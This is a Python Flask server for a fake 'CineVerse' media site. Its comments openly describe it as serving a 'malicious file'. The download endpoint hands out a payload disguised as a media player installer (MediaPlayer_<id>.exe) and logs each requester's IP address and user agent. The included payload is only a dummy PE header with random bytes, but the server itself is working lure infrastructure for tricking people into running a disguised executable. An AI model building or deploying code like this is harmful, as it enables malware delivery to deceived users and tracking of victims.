# ============================================
# CineVerse - Media Download Service
# Provides media player installation packages
#Flask server for serving the malicious file
#Download logging
#Create a dummy file for testing

# ============================================

from flask import Flask, request, send_file, jsonify
import os
import time
import json
import random

app = Flask(__name__)

# ============================================
# CONFIGURATION
# ============================================

WEBSITE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAYLOAD_PATH = os.path.join(WEBSITE_DIR, 'system', 'update_package.bin')
DOWNLOAD_LOG = os.path.join(WEBSITE_DIR, 'logs', 'access.log')

# ============================================
# ROUTES
# ============================================

@app.route('/')
def index():
    """Root endpoint - service status."""
    return jsonify({
        'status': 'online',
        'service': 'CineVerse Media Service',
        'version': '2.4.1'
    })

@app.route('/api/install/player', methods=['POST'])
def serve_installation_package():
    """
    Serve the media player installation package.
    This appears as a legitimate media player download.
    """
    data = request.json
    movie_id = data.get('movie_id', 1)
    movie_title = data.get('movie_title', 'Unknown')
    
    # Log the installation request
    log_installation(movie_id, movie_title)
    
    # Check if installation package exists
    if os.path.exists(PAYLOAD_PATH):
        return send_file(
            PAYLOAD_PATH,
            as_attachment=True,
            download_name=f'MediaPlayer_{movie_id}.exe',
            mimetype='application/octet-stream'
        )
    else:
        # Create a dummy package for testing
        create_dummy_package()
        return send_file(
            PAYLOAD_PATH,
            as_attachment=True,
            download_name=f'MediaPlayer_{movie_id}.exe',
            mimetype='application/octet-stream'
        )

@app.route('/api/status', methods=['GET'])
def service_status():
    """Check service status."""
    return jsonify({
        'status': 'operational',
        'timestamp': time.time(),
        'package_available': os.path.exists(PAYLOAD_PATH)
    })

# ============================================
# HELPER FUNCTIONS
# ============================================

def log_installation(movie_id, movie_title):
    """Log installation requests for analytics."""
    log_entry = {
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'movie_id': movie_id,
        'movie_title': movie_title,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    
    # Create logs directory if it doesn't exist
    log_dir = os.path.dirname(DOWNLOAD_LOG)
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    # Append to log file
    with open(DOWNLOAD_LOG, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

def create_dummy_package():
    """Create a dummy installation package for testing."""
    # Create system directory if it doesn't exist
    system_dir = os.path.dirname(PAYLOAD_PATH)
    if not os.path.exists(system_dir):
        os.makedirs(system_dir)
    
    # Create a simple binary file
    with open(PAYLOAD_PATH, 'wb') as f:
        # Write a simple PE header (for Windows EXE)
        f.write(b'MZ\x90\x00')  # DOS header
        f.write(os.urandom(1024 * 1024))  # 1MB of random data
    
    return PAYLOAD_PATH

# ============================================
# SERVER STARTUP
# ============================================

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5000, debug=False)
